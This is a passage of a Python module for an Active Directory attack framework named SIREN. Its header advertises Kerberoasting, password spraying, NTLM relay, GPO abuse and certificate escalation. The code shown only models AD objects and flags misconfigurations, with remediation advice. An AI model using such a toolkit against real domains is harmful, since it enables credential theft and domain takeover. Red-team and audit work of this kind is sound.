#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  SIREN AD ATTACK — Active Directory Offensive Engine                          ██
██                                                                                ██
██  Motor ofensivo completo para ambientes Active Directory.                     ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    * LDAP enumeration — DCs, trusts, OUs, GPOs, admin groups                 ██
██    * Kerberoasting — SPN enumeration, TGS-REP formatting, crack estimation   ██
██    * AS-REP roasting — accounts without pre-authentication                    ██
██    * DCSync simulation — replication privilege detection                       ██
██    * NTLM relay — relay targets, SMB signing, EPA checks                     ██
██    * Password spraying — lockout-aware, seasonal patterns, timing             ██
██    * GPO abuse — writable GPO detection, scheduled task injection             ██
██    * Certificate abuse — ESC1-ESC8 escalation paths                          ██
██    * BloodHound analysis — BFS/Dijkstra shortest path to DA                  ██
██    * Full orchestration — enumerate, attack, analyze, report                  ██
██                                                                                ██
██  "SIREN domina o diretorio — cada objeto e um passo rumo ao dominio total."  ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import os
import re
import struct
import threading
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("siren.arsenal.ad_attack")


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class ADProtocol(Enum):
    """Protocols used in AD enumeration and attack."""
    LDAP = auto()
    LDAPS = auto()
    KERBEROS = auto()
    SMB = auto()
    NTLM = auto()
    RPC = auto()
    SAMR = auto()
    DRSUAPI = auto()
    HTTP = auto()
    HTTPS = auto()


class TrustDirection(Enum):
    """AD trust direction types."""
    INBOUND = auto()
    OUTBOUND = auto()
    BIDIRECTIONAL = auto()
    DISABLED = auto()


class TrustType(Enum):
    """AD trust types."""
    PARENT_CHILD = auto()
    CROSS_LINK = auto()
    EXTERNAL = auto()
    FOREST = auto()
    MIT = auto()
    DCE = auto()


class DelegationType(Enum):
    """Kerberos delegation types."""
    UNCONSTRAINED = auto()
    CONSTRAINED = auto()
    RESOURCE_BASED = auto()
    NONE = auto()


class EncryptionType(Enum):
    """Kerberos encryption types."""
    RC4_HMAC = auto()
    AES128_CTS = auto()
    AES256_CTS = auto()
    DES_CBC_MD5 = auto()
    DES_CBC_CRC = auto()


class AttackPhase(Enum):
    """Phase of the AD attack lifecycle."""
    ENUMERATION = auto()
    CREDENTIAL_HARVEST = auto()
    LATERAL_MOVEMENT = auto()
    PRIVILEGE_ESCALATION = auto()
    PERSISTENCE = auto()
    DOMAIN_DOMINANCE = auto()


class FindingSeverity(Enum):
    """Severity levels for AD findings."""
    CRITICAL = auto()
    HIGH = auto()
    MEDIUM = auto()
    LOW = auto()
    INFO = auto()


class GPOPermission(Enum):
    """GPO permission types."""
    FULL_CONTROL = auto()
    WRITE = auto()
    WRITE_DACL = auto()
    WRITE_PROPERTY = auto()
    CREATE_CHILD = auto()
    READ = auto()


class CertTemplateFlag(Enum):
    """Certificate template enrollment flags."""
    ENROLLEE_SUPPLIES_SUBJECT = auto()
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = auto()
    PEND_ALL_REQUESTS = auto()
    PUBLISH_TO_DS = auto()
    AUTO_ENROLLMENT = auto()
    MACHINE_TYPE = auto()


class ESCType(Enum):
    """AD CS escalation path types."""
    ESC1 = auto()
    ESC2 = auto()
    ESC3 = auto()
    ESC4 = auto()
    ESC5 = auto()
    ESC6 = auto()
    ESC7 = auto()
    ESC8 = auto()


class NodeType(Enum):
    """BloodHound graph node types."""
    USER = auto()
    COMPUTER = auto()
    GROUP = auto()
    DOMAIN = auto()
    GPO = auto()
    OU = auto()
    CERT_TEMPLATE = auto()
    CA = auto()


class EdgeType(Enum):
    """BloodHound graph edge/relationship types."""
    MEMBER_OF = auto()
    HAS_SESSION = auto()
    ADMIN_TO = auto()
    CAN_RDP = auto()
    CAN_PSREMOTE = auto()
    EXECUTE_DCOM = auto()
    GENERIC_ALL = auto()
    GENERIC_WRITE = auto()
    WRITE_DACL = auto()
    WRITE_OWNER = auto()
    OWNS = auto()
    ADD_MEMBER = auto()
    FORCE_CHANGE_PASSWORD = auto()
    READ_LAPS_PASSWORD = auto()
    READ_GMSA_PASSWORD = auto()
    ALLOWED_TO_DELEGATE = auto()
    ALLOWED_TO_ACT = auto()
    HAS_SID_HISTORY = auto()
    CONTAINS = auto()
    GP_LINK = auto()
    TRUSTED_BY = auto()
    DCSYNC = auto()
    ENROLL = auto()
    WRITE_PKI = auto()


class SprayStrategy(Enum):
    """Password spray timing strategies."""
    CONSERVATIVE = auto()
    MODERATE = auto()
    AGGRESSIVE = auto()
    STEALTH = auto()


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class ADFinding:
    """A single finding from AD enumeration or attack."""
    finding_id: str = ""
    title: str = ""
    description: str = ""
    severity: FindingSeverity = FindingSeverity.INFO
    phase: AttackPhase = AttackPhase.ENUMERATION
    affected_objects: List[str] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    mitre_technique: str = ""
    remediation: str = ""
    timestamp: float = 0.0
    confidence: float = 0.0
    tags: List[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        if not self.finding_id:
            self.finding_id = f"AD-{uuid.uuid4().hex[:12].upper()}"
        if self.timestamp == 0.0:
            self.timestamp = time.time()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "title": self.title,
            "description": self.description,
            "severity": self.severity.name,
            "phase": self.phase.name,
            "affected_objects": self.affected_objects,
            "evidence": self.evidence,
            "mitre_technique": self.mitre_technique,
            "remediation": self.remediation,
            "timestamp": self.timestamp,
            "confidence": self.confidence,
            "tags": self.tags,
        }


@dataclass
class ADReport:
    """Aggregated report of AD attack findings."""
    report_id: str = ""
    domain: str = ""
    findings: List[ADFinding] = field(default_factory=list)
    domain_info: Optional[Dict[str, Any]] = None
    attack_paths: List[Dict[str, Any]] = field(default_factory=list)
    statistics: Dict[str, Any] = field(default_factory=dict)
    start_time: float = 0.0
    end_time: float = 0.0
    generated_at: float = 0.0

    def __post_init__(self) -> None:
        if not self.report_id:
            self.report_id = f"ADRPT-{uuid.uuid4().hex[:10].upper()}"
        if self.generated_at == 0.0:
            self.generated_at = time.time()

    def severity_counts(self) -> Dict[str, int]:
        counts: Dict[str, int] = {}
        for s in FindingSeverity:
            counts[s.name] = sum(1 for f in self.findings if f.severity == s)
        return counts

    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "domain": self.domain,
            "findings": [f.to_dict() for f in self.findings],
            "domain_info": self.domain_info,
            "attack_paths": self.attack_paths,
            "statistics": self.statistics,
            "severity_counts": self.severity_counts(),
            "start_time": self.start_time,
            "end_time": self.end_time,
            "generated_at": self.generated_at,
        }


@dataclass
class SPNEntry:
    """Service Principal Name entry for Kerberoasting."""
    spn: str = ""
    username: str = ""
    domain: str = ""
    encryption_type: EncryptionType = EncryptionType.RC4_HMAC
    service_class: str = ""
    hostname: str = ""
    port: int = 0
    account_dn: str = ""
    password_last_set: float = 0.0
    is_admin: bool = False
    is_enabled: bool = True
    delegation_type: DelegationType = DelegationType.NONE
    description: str = ""
    tgs_hash: str = ""
    estimated_crack_seconds: float = 0.0

    def __post_init__(self) -> None:
        if self.spn and not self.service_class:
            parts = self.spn.split("/")
            if parts:
                self.service_class = parts[0]
            if len(parts) > 1:
                host_part = parts[1].split(":")
                self.hostname = host_part[0]
                if len(host_part) > 1:
                    try:
                        self.port = int(host_part[1])
                    except ValueError:
                        pass

    def to_dict(self) -> Dict[str, Any]:
        return {
            "spn": self.spn,
            "username": self.username,
            "domain": self.domain,
            "encryption_type": self.encryption_type.name,
            "service_class": self.service_class,
            "hostname": self.hostname,
            "port": self.port,
            "account_dn": self.account_dn,
            "password_last_set": self.password_last_set,
            "is_admin": self.is_admin,
            "is_enabled": self.is_enabled,
            "delegation_type": self.delegation_type.name,
            "description": self.description,
            "tgs_hash": self.tgs_hash,
            "estimated_crack_seconds": self.estimated_crack_seconds,
        }


@dataclass
class DomainInfo:
    """Comprehensive domain information from LDAP enumeration."""
    domain_name: str = ""
    domain_sid: str = ""
    forest_name: str = ""
    functional_level: str = ""
    domain_controllers: List[Dict[str, Any]] = field(default_factory=list)
    trusts: List[Dict[str, Any]] = field(default_factory=list)
    ous: List[Dict[str, Any]] = field(default_factory=list)
    gpos: List[Dict[str, Any]] = field(default_factory=list)
    admin_groups: List[Dict[str, Any]] = field(default_factory=list)
    service_accounts: List[Dict[str, Any]] = field(default_factory=list)
    delegation_entries: List[Dict[str, Any]] = field(default_factory=list)
    laps_enabled: bool = False
    laps_computers: List[str] = field(default_factory=list)
    admin_sd_holder_protected: List[str] = field(default_factory=list)
    machine_account_quota: int = 10
    password_policy: Dict[str, Any] = field(default_factory=dict)
    total_users: int = 0
    total_computers: int = 0
    total_groups: int = 0
    dns_zones: List[str] = field(default_factory=list)
    schema_version: int = 0
    enumeration_time: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "domain_name": self.domain_name,
            "domain_sid": self.domain_sid,
            "forest_name": self.forest_name,
            "functional_level": self.functional_level,
            "domain_controllers": self.domain_controllers,
            "trusts": self.trusts,
            "ous": self.ous,
            "gpos": self.gpos,
            "admin_groups": self.admin_groups,
            "service_accounts": self.service_accounts,
            "delegation_entries": self.delegation_entries,
            "laps_enabled": self.laps_enabled,
            "laps_computers": self.laps_computers,
            "admin_sd_holder_protected": self.admin_sd_holder_protected,
            "machine_account_quota": self.machine_account_quota,
            "password_policy": self.password_policy,
            "total_users": self.total_users,
            "total_computers": self.total_computers,
            "total_groups": self.total_groups,
            "dns_zones": self.dns_zones,
            "schema_version": self.schema_version,
            "enumeration_time": self.enumeration_time,
        }


@dataclass
class RelayTarget:
    """Target for NTLM relay attacks."""
    hostname: str = ""
    ip_address: str = ""
    port: int = 445
    protocol: str = "SMB"
    smb_signing: bool = True
    epa_enabled: bool = False
    services: List[str] = field(default_factory=list)
    os_version: str = ""
    is_dc: bool = False
    is_exchange: bool = False
    is_adcs: bool = False
    relay_viable: bool = False
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "port": self.port,
            "protocol": self.protocol,
            "smb_signing": self.smb_signing,
            "epa_enabled": self.epa_enabled,
            "services": self.services,
            "os_version": self.os_version,
            "is_dc": self.is_dc,
            "is_exchange": self.is_exchange,
            "is_adcs": self.is_adcs,
            "relay_viable": self.relay_viable,
            "notes": self.notes,
        }


@dataclass
class SprayResult:
    """Result of a password spray attempt."""
    username: str = ""
    password: str = ""
    success: bool = False
    locked_out: bool = False
    error_code: str = ""
    error_message: str = ""
    timestamp: float = 0.0
    response_time_ms: float = 0.0

    def __post_init__(self) -> None:
        if self.timestamp == 0.0:
            self.timestamp = time.time()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "password": self.password,
            "success": self.success,
            "locked_out": self.locked_out,
            "error_code": self.error_code,
            "error_message": self.error_message,
            "timestamp": self.timestamp,
            "response_time_ms": self.response_time_ms,
        }


@dataclass
class GPOInfo:
    """GPO information for abuse analysis."""
    gpo_id: str = ""
    display_name: str = ""
    gpo_dn: str = ""
    gpc_path: str = ""
    linked_ous: List[str] = field(default_factory=list)
    owner: str = ""
    permissions: List[Dict[str, Any]] = field(default_factory=list)
    writable_by: List[str] = field(default_factory=list)
    has_scheduled_tasks: bool = False
    has_scripts: bool = False
    has_msi: bool = False
    version_user: int = 0
    version_computer: int = 0
    created: float = 0.0
    modified: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "gpo_id": self.gpo_id,
            "display_name": self.display_name,
            "gpo_dn": self.gpo_dn,
            "gpc_path": self.gpc_path,
            "linked_ous": self.linked_ous,
            "owner": self.owner,
            "permissions": self.permissions,
            "writable_by": self.writable_by,
            "has_scheduled_tasks": self.has_scheduled_tasks,
            "has_scripts": self.has_scripts,
            "has_msi": self.has_msi,
            "version_user": self.version_user,
            "version_computer": self.version_computer,
            "created": self.created,
            "modified": self.modified,
        }


@dataclass
class CertTemplate:
    """AD CS certificate template for abuse analysis."""
    name: str = ""
    display_name: str = ""
    oid: str = ""
    schema_version: int = 0
    enrollment_flags: int = 0
    authorized_signatures: int = 0
    enrollee_supplies_subject: bool = False
    client_auth: bool = False
    any_purpose: bool = False
    enrollment_agent: bool = False
    enroll_permissions: List[Dict[str, Any]] = field(default_factory=list)
    write_permissions: List[Dict[str, Any]] = field(default_factory=list)
    owner: str = ""
    ca_name: str = ""
    validity_period: str = ""
    renewal_period: str = ""
    esc_paths: List[ESCType] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "display_name": self.display_name,
            "oid": self.oid,
            "schema_version": self.schema_version,
            "enrollment_flags": self.enrollment_flags,
            "authorized_signatures": int(self.authorized_signatures),
            "enrollee_supplies_subject": self.enrollee_supplies_subject,
            "client_auth": self.client_auth,
            "any_purpose": self.any_purpose,
            "enrollment_agent": self.enrollment_agent,
            "enroll_permissions": self.enroll_permissions,
            "write_permissions": self.write_permissions,
            "owner": self.owner,
            "ca_name": self.ca_name,
            "validity_period": self.validity_period,
            "renewal_period": self.renewal_period,
            "esc_paths": [e.name for e in self.esc_paths],
        }


@dataclass
class GraphNode:
    """Node in the BloodHound-style attack graph."""
    node_id: str = ""
    name: str = ""
    node_type: NodeType = NodeType.USER
    domain: str = ""
    properties: Dict[str, Any] = field(default_factory=dict)
    is_high_value: bool = False
    is_owned: bool = False
    sid: str = ""

    def __post_init__(self) -> None:
        if not self.node_id:
            self.node_id = f"{self.node_type.name}-{uuid.uuid4().hex[:8]}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "node_id": self.node_id,
            "name": self.name,
            "node_type": self.node_type.name,
            "domain": self.domain,
            "properties": self.properties,
            "is_high_value": self.is_high_value,
            "is_owned": self.is_owned,
            "sid": self.sid,
        }


@dataclass
class GraphEdge:
    """Edge in the BloodHound-style attack graph."""
    source_id: str = ""
    target_id: str = ""
    edge_type: EdgeType = EdgeType.MEMBER_OF
    weight: float = 1.0
    properties: Dict[str, Any] = field(default_factory=dict)
    is_transitive: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "source_id": self.source_id,
            "target_id": self.target_id,
            "edge_type": self.edge_type.name,
            "weight": self.weight,
            "properties": self.properties,
            "is_transitive": self.is_transitive,
        }


@dataclass
class AttackPath:
    """A discovered attack path from source to target."""
    path_id: str = ""
    source_node: str = ""
    target_node: str = ""
    hops: List[Dict[str, Any]] = field(default_factory=list)
    total_cost: float = 0.0
    techniques: List[str] = field(default_factory=list)
    risk_score: float = 0.0
    feasibility: float = 0.0
    description: str = ""

    def __post_init__(self) -> None:
        if not self.path_id:
            self.path_id = f"PATH-{uuid.uuid4().hex[:10].upper()}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "path_id": self.path_id,
            "source_node": self.source_node,
            "target_node": self.target_node,
            "hops": self.hops,
            "total_cost": self.total_cost,
            "techniques": self.techniques,
            "risk_score": self.risk_score,
            "feasibility": self.feasibility,
            "description": self.description,
        }


# ════════════════════════════════════════════════════════════════════════════════
# LDAP ENUMERATOR
# ════════════════════════════════════════════════════════════════════════════════

class LDAPEnumerator:
    """
    Enumerates Active Directory via LDAP queries.

    Discovers domain controllers, trusts, OUs, GPOs, admin groups,
    service accounts, delegation types, LAPS status, AdminSDHolder,
    and MachineAccountQuota.

    Usage:
        enumerator = LDAPEnumerator("corp.local")
        domain_info = enumerator.enumerate_all(ldap_data)
    """

    # Well-known SIDs for privileged groups
    PRIVILEGED_SIDS: Dict[str, str] = {
        "S-1-5-32-544": "Administrators",
        "S-1-5-32-548": "Account Operators",
        "S-1-5-32-549": "Server Operators",
        "S-1-5-32-550": "Print Operators",
        "S-1-5-32-551": "Backup Operators",
    }

    PRIVILEGED_GROUP_NAMES: Set[str] = {
        "Domain Admins",
        "Enterprise Admins",
        "Schema Admins",
        "Administrators",
        "Account Operators",
        "Server Operators",
        "Backup Operators",
        "DnsAdmins",
        "Group Policy Creator Owners",
        "Key Admins",
        "Enterprise Key Admins",
    }

    FUNCTIONAL_LEVELS: Dict[int, str] = {
        0: "Windows 2000",
        1: "Windows Server 2003 Mixed",
        2: "Windows Server 2003",
        3: "Windows Server 2008",
        4: "Windows Server 2008 R2",
        5: "Windows Server 2012",
        6: "Windows Server 2012 R2",
        7: "Windows Server 2016",
        8: "Windows Server 2019",
        9: "Windows Server 2022",
        10: "Windows Server 2025",
    }

    DELEGATION_UACS: Dict[int, DelegationType] = {
        0x80000: DelegationType.UNCONSTRAINED,    # TRUSTED_FOR_DELEGATION
        0x1000000: DelegationType.CONSTRAINED,     # TRUSTED_TO_AUTH_FOR_DELEGATION
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._base_dn = self._domain_to_dn(domain)
        self._findings: List[ADFinding] = []
        logger.info("LDAPEnumerator initialized for domain '%s'", domain)

    @staticmethod
    def _domain_to_dn(domain: str) -> str:
        """Convert domain name to LDAP distinguished name."""
        parts = domain.split(".")
        return ",".join(f"DC={p}" for p in parts)

    def enumerate_all(self, ldap_data: Dict[str, Any]) -> DomainInfo:
        """
        Run all enumeration routines against provided LDAP dataset.

        Args:
            ldap_data: Dictionary containing LDAP query results keyed by category.

        Returns:
            Populated DomainInfo dataclass.
        """
        with self._lock:
            start = time.time()
            info = DomainInfo(domain_name=self._domain)
            self._findings.clear()

            info.forest_name = ldap_data.get("forest_name", self._domain)
            info.domain_sid = ldap_data.get("domain_sid", "")
            fl = ldap_data.get("functional_level", -1)
            info.functional_level = self.FUNCTIONAL_LEVELS.get(fl, f"Unknown ({fl})")
            info.schema_version = ldap_data.get("schema_version", 0)

            info.domain_controllers = self._enumerate_domain_controllers(ldap_data)
            info.trusts = self._enumerate_trusts(ldap_data)
            info.ous = self._enumerate_ous(ldap_data)
            info.gpos = self._enumerate_gpos(ldap_data)
            info.admin_groups = self._enumerate_admin_groups(ldap_data)
            info.service_accounts = self._enumerate_service_accounts(ldap_data)
            info.delegation_entries = self._enumerate_delegation(ldap_data)
            info.password_policy = self._extract_password_policy(ldap_data)

            laps_result = self._check_laps(ldap_data)
            info.laps_enabled = laps_result[0]
            info.laps_computers = laps_result[1]

            info.admin_sd_holder_protected = self._check_admin_sd_holder(ldap_data)
            info.machine_account_quota = self._check_machine_account_quota(ldap_data)

            info.total_users = ldap_data.get("total_users", 0)
            info.total_computers = ldap_data.get("total_computers", 0)
            info.total_groups = ldap_data.get("total_groups", 0)
            info.dns_zones = ldap_data.get("dns_zones", [])

            info.enumeration_time = time.time() - start
            logger.info(
                "Enumeration complete: %d DCs, %d trusts, %d OUs, %d GPOs in %.2fs",
                len(info.domain_controllers),
                len(info.trusts),
                len(info.ous),
                len(info.gpos),
                info.enumeration_time,
            )
            return info

    def get_findings(self) -> List[ADFinding]:
        """Return findings generated during enumeration."""
        with self._lock:
            return list(self._findings)

    def _enumerate_domain_controllers(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate domain controllers from LDAP data."""
        dcs: List[Dict[str, Any]] = []
        raw_dcs = ldap_data.get("domain_controllers", [])
        for dc_entry in raw_dcs:
            dc_info: Dict[str, Any] = {
                "hostname": dc_entry.get("hostname", ""),
                "ip_address": dc_entry.get("ip_address", ""),
                "os_version": dc_entry.get("os_version", ""),
                "is_gc": dc_entry.get("is_gc", False),
                "is_rodc": dc_entry.get("is_rodc", False),
                "site": dc_entry.get("site", "Default-First-Site-Name"),
                "dn": dc_entry.get("dn", ""),
                "roles": dc_entry.get("roles", []),
            }
            dcs.append(dc_info)

            # Check for outdated OS on DCs
            os_ver = dc_info["os_version"].lower()
            outdated_patterns = [
                "2003", "2008", "2008 r2", "2012", "2012 r2",
            ]
            for pat in outdated_patterns:
                if pat in os_ver:
                    self._findings.append(ADFinding(
                        title=f"Domain Controller running outdated OS: {dc_info['os_version']}",
                        description=(
                            f"DC '{dc_info['hostname']}' runs {dc_info['os_version']} "
                            f"which may lack modern security features and patches."
                        ),
                        severity=FindingSeverity.HIGH,
                        phase=AttackPhase.ENUMERATION,
                        affected_objects=[dc_info["hostname"]],
                        evidence={"os_version": dc_info["os_version"]},
                        mitre_technique="T1018",
                        remediation="Upgrade domain controller to Windows Server 2019 or later.",
                        confidence=0.95,
                        tags=["dc", "outdated-os"],
                    ))
                    break
        return dcs

    def _enumerate_trusts(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate domain and forest trusts."""
        trusts: List[Dict[str, Any]] = []
        raw_trusts = ldap_data.get("trusts", [])
        for t in raw_trusts:
            direction_val = t.get("direction", 0)
            if direction_val == 1:
                direction = TrustDirection.INBOUND
            elif direction_val == 2:
                direction = TrustDirection.OUTBOUND
            elif direction_val == 3:
                direction = TrustDirection.BIDIRECTIONAL
            else:
                direction = TrustDirection.DISABLED

            type_val = t.get("type", 0)
            type_map = {
                1: TrustType.PARENT_CHILD,
                2: TrustType.CROSS_LINK,
                3: TrustType.EXTERNAL,
                4: TrustType.FOREST,
                5: TrustType.MIT,
            }
            trust_type = type_map.get(type_val, TrustType.EXTERNAL)

            trust_info: Dict[str, Any] = {
                "partner": t.get("partner", ""),
                "direction": direction.name,
                "type": trust_type.name,
                "is_transitive": t.get("is_transitive", False),
                "sid_filtering": t.get("sid_filtering", True),
                "selective_auth": t.get("selective_auth", False),
                "tgt_delegation": t.get("tgt_delegation", False),
                "encryption_types": t.get("encryption_types", []),
                "created": t.get("created", 0.0),
            }
            trusts.append(trust_info)

            # Flag trusts without SID filtering
            if not trust_info["sid_filtering"]:
                self._findings.append(ADFinding(
                    title=f"Trust to '{trust_info['partner']}' lacks SID filtering",
                    description=(
                        f"The trust relationship with '{trust_info['partner']}' does not "
                        f"enforce SID filtering, allowing SID history injection attacks."
                    ),
                    severity=FindingSeverity.CRITICAL,
                    phase=AttackPhase.ENUMERATION,
                    affected_objects=[trust_info["partner"]],
                    evidence=trust_info,
                    mitre_technique="T1134.005",
                    remediation="Enable SID filtering on the trust (netdom trust /quarantine:yes).",
                    confidence=0.98,
                    tags=["trust", "sid-filtering"],
                ))

            # Flag bidirectional external trusts
            if (direction == TrustDirection.BIDIRECTIONAL
                    and trust_type == TrustType.EXTERNAL):
                self._findings.append(ADFinding(
                    title=f"Bidirectional external trust with '{trust_info['partner']}'",
                    description=(
                        f"A bidirectional external trust exists with '{trust_info['partner']}'. "
                        f"This expands the attack surface significantly."
                    ),
                    severity=FindingSeverity.HIGH,
                    phase=AttackPhase.ENUMERATION,
                    affected_objects=[trust_info["partner"]],
                    evidence=trust_info,
                    mitre_technique="T1482",
                    remediation="Review trust necessity; consider making it one-way or removing it.",
                    confidence=0.9,
                    tags=["trust", "bidirectional", "external"],
                ))
        return trusts

    def _enumerate_ous(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate organizational units."""
        ous: List[Dict[str, Any]] = []
        raw_ous = ldap_data.get("ous", [])
        for ou in raw_ous:
            ou_info: Dict[str, Any] = {
                "name": ou.get("name", ""),
                "dn": ou.get("dn", ""),
                "description": ou.get("description", ""),
                "gpo_links": ou.get("gpo_links", []),
                "child_count": ou.get("child_count", 0),
                "delegation": ou.get("delegation", []),
                "protected": ou.get("protected", False),
                "block_inheritance": ou.get("block_inheritance", False),
            }
            ous.append(ou_info)

            # Flag OUs that block GPO inheritance
            if ou_info["block_inheritance"]:
                self._findings.append(ADFinding(
                    title=f"OU '{ou_info['name']}' blocks GPO inheritance",
                    description=(
                        f"OU '{ou_info['dn']}' blocks GPO inheritance which may "
                        f"prevent security policies from being applied."
                    ),
                    severity=FindingSeverity.MEDIUM,
                    phase=AttackPhase.ENUMERATION,
                    affected_objects=[ou_info["dn"]],
                    evidence={"block_inheritance": True},
                    mitre_technique="T1484.001",
                    remediation="Review GPO inheritance blocking; ensure security policies still apply.",
                    confidence=0.85,
                    tags=["ou", "gpo-inheritance"],
                ))
        return ous

    def _enumerate_gpos(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate Group Policy Objects."""
        gpos: List[Dict[str, Any]] = []
        raw_gpos = ldap_data.get("gpos", [])
        for gpo in raw_gpos:
            gpo_info: Dict[str, Any] = {
                "display_name": gpo.get("display_name", ""),
                "gpo_id": gpo.get("gpo_id", ""),
                "gpc_path": gpo.get("gpc_path", ""),
                "linked_ous": gpo.get("linked_ous", []),
                "owner": gpo.get("owner", ""),
                "status": gpo.get("status", "enabled"),
                "version_user": gpo.get("version_user", 0),
                "version_computer": gpo.get("version_computer", 0),
                "permissions": gpo.get("permissions", []),
                "writable_by": gpo.get("writable_by", []),
                "created": gpo.get("created", 0.0),
                "modified": gpo.get("modified", 0.0),
            }
            gpos.append(gpo_info)
        return gpos

    def _enumerate_admin_groups(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate privileged/admin groups and their members."""
        admin_groups: List[Dict[str, Any]] = []
        raw_groups = ldap_data.get("groups", [])
        for grp in raw_groups:
            name = grp.get("name", "")
            sid = grp.get("sid", "")
            is_privileged = (
                name in self.PRIVILEGED_GROUP_NAMES
                or sid in self.PRIVILEGED_SIDS
            )
            if not is_privileged:
                continue

            members = grp.get("members", [])
            nested = grp.get("nested_members", [])
            group_info: Dict[str, Any] = {
                "name": name,
                "dn": grp.get("dn", ""),
                "sid": sid,
                "member_count": len(members),
                "members": members,
                "nested_member_count": len(nested),
                "nested_members": nested,
                "description": grp.get("description", ""),
                "admin_count": grp.get("admin_count", 0),
            }
            admin_groups.append(group_info)

            # Flag large admin groups
            total_members = len(members) + len(nested)
            if total_members > 10 and name in ("Domain Admins", "Enterprise Admins"):
                self._findings.append(ADFinding(
                    title=f"Excessive members in '{name}' ({total_members} total)",
                    description=(
                        f"The group '{name}' has {total_members} direct/nested members. "
                        f"Best practice recommends fewer than 5 members in Tier 0 groups."
                    ),
                    severity=FindingSeverity.HIGH,
                    phase=AttackPhase.ENUMERATION,
                    affected_objects=[name],
                    evidence={"member_count": total_members, "members": members[:20]},
                    mitre_technique="T1078.002",
                    remediation="Reduce membership to essential personnel; implement tiered admin model.",
                    confidence=0.95,
                    tags=["admin-groups", "excessive-privileges"],
                ))
        return admin_groups

    def _enumerate_service_accounts(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate service accounts (SPN-bearing user objects)."""
        svc_accounts: List[Dict[str, Any]] = []
        raw_users = ldap_data.get("users", [])
        for user in raw_users:
            spns = user.get("spns", [])
            if not spns:
                continue
            acct: Dict[str, Any] = {
                "username": user.get("username", ""),
                "dn": user.get("dn", ""),
                "spns": spns,
                "enabled": user.get("enabled", True),
                "password_last_set": user.get("password_last_set", 0.0),
                "last_logon": user.get("last_logon", 0.0),
                "admin_count": user.get("admin_count", 0),
                "description": user.get("description", ""),
                "delegation_type": user.get("delegation_type", "NONE"),
                "is_managed": user.get("is_managed", False),
            }
            svc_accounts.append(acct)

            # Check for old passwords on service accounts
            pwd_age_days = 0.0
            if acct["password_last_set"] > 0:
                pwd_age_days = (time.time() - acct["password_last_set"]) / 86400.0
            if pwd_age_days > 365:
                self._findings.append(ADFinding(
                    title=f"Service account '{acct['username']}' password is {int(pwd_age_days)} days old",
                    description=(
                        f"Service account '{acct['username']}' has not changed its password in "
                        f"{int(pwd_age_days)} days. Old service account passwords are prime "
                        f"targets for Kerberoasting."
                    ),
                    severity=FindingSeverity.HIGH,
                    phase=AttackPhase.ENUMERATION,
                    affected_objects=[acct["username"]],
                    evidence={"password_age_days": int(pwd_age_days), "spns": spns},
                    mitre_technique="T1558.003",
                    remediation="Rotate service account password; consider using gMSA.",
                    confidence=0.9,
                    tags=["service-account", "kerberoast", "old-password"],
                ))
        return svc_accounts

    def _enumerate_delegation(
        self, ldap_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Enumerate Kerberos delegation configurations."""
        entries: List[Dict[str, Any]] = []
        all_objects = ldap_data.get("users", []) + ldap_data.get("computers", [])
        for obj in all_objects:
            uac = obj.get("uac", 0)
            deleg_type = DelegationType.NONE
            for flag, dt in self.DELEGATION_UACS.items():
                if uac & flag:
                    deleg_type = dt
                    break
            # Resource-based constrained delegation
            rbcd_sids = obj.get("msDS-AllowedToActOnBehalfOfOtherIdentity", [])
            if rbcd_sids:
                deleg_type = DelegationType.RESOURCE_BASED

            if deleg_type == DelegationType.NONE:
                continue

            allowed_to = obj.get("msDS-AllowedToDelegateTo", [])
            entry: Dict[str, Any] = {
                "name": obj.get("name", obj.get("username", "")),
                "dn": obj.get("dn", ""),
                "type": "computer" if "computer" in obj.get("object_class", "") else "user",
                "delegation_type": deleg_type.name,
                "allowed_to_delegate_to": allowed_to,
                "rbcd_sids": rbcd_sids,
                "protocol_transition": obj.get("protocol_transition", False),
                "is_dc": obj.get("is_dc", False),
            }
            entries.append(entry)

            # Flag unconstrained delegation (not on DCs)
            if deleg_type == DelegationType.UNCONSTRAINED and not entry["is_dc"]:
                self._findings.append(ADFinding(
                    title=f"Unconstrained delegation on '{entry['name']}'",
                    description=(
                        f"Object '{entry['name']}' has unconstrained delegation enabled. "
                        f"Any service ticket obtained by this account can be forwarded, "
                        f"enabling credential theft via Printer Bug or similar techniques."
                    ),
                    severity=FindingSeverity.CRITICAL,
                    phase=AttackPhase.ENUMERATION,
